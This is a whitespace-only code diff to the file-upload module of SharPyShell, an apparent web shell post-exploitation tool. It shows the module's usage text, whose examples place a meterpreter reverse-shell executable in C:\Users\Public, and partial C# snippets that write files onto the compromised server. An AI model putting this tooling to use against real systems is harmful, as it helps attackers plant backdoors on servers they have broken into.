@@ -15,29 +15,29 @@ class Upload(Module):
         In this module has been considered the limit of the data you can send/receive through post request.
         So if a file is larger than 100 KB it will be splitted into multiple requests over the network.
         The chunk size parameter could be modified.
-        
+
         Usage:
             #upload local_input_path [remote_output_path] [chunk_size]
-            
+
         Positional arguments:
             local_input_path                The file path you want to download from the remote server
             remote_output_path              The path where the file will be saved on your local machine
                                             Default: current working directory + original filename
             chunk_size                      The maximum limit of a chunk to be transferred over the network
                                             Default: 102400
-        
+
         Examples:
-            Upload a meterpreter agent:            
+            Upload a meterpreter agent:
                 #upload /tmp/revshell.exe
-            Upload a meterpreter agent to C:\Users\Public directory:            
+            Upload a meterpreter agent to C:\Users\Public directory:
                 #upload /tmp/revshell.exe C:\Users\Public\revshell.exe
-            Upload a meterpreter agent to C:\Users\Public directory splitting into multiple requests of 1 KB:            
+            Upload a meterpreter agent to C:\Users\Public directory splitting into multiple requests of 1 KB:
                 #upload /tmp/revshell.exe C:\Users\Public\revshell.exe 1024
     """
 
     _runtime_code = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
-            public class SharPyShell{                    
+            public class SharPyShell{
                 byte[] Upload(string path, byte[] file_bytes){
                     byte[] upload_response=Encoding.UTF8.GetBytes("File uploaded correctly to: " + path);
                     try{
@@ -58,7 +58,7 @@ class Upload(Module):
 
     __runtime_code_split_file = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
-            public class SharPyShell{                    
+            public class SharPyShell{
                 byte[] Upload(string path, byte[] file_bytes){
                     byte[] upload_response=Encoding.UTF8.GetBytes("File uploaded correctly to: " + path);
                     try{
@@ -82,7 +82,7 @@ class Upload(Module):
 
     __runtime_code_init_file = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
-                public class SharPyShell{                    
+                public class SharPyShell{
                     string InitFile(string path){
                         string output = "{{{SharPyShellSuccess}}} File initialized correctly.";
                         try{
